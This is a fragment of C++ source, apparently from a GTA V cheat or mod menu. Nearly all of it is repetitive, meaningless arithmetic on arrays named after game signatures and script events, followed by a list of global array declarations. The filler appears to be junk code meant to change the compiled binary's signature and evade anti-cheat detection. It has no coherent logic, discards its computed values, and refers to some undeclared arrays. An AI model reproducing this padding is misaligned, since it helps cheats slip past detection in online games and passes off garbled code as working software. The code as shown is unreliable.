				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			size_t start_pos = 0;
			while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
				str.replace(start_pos, from.length(), to);
				start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
			}
			return str;
		}
	}
	namespace File_Manager
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
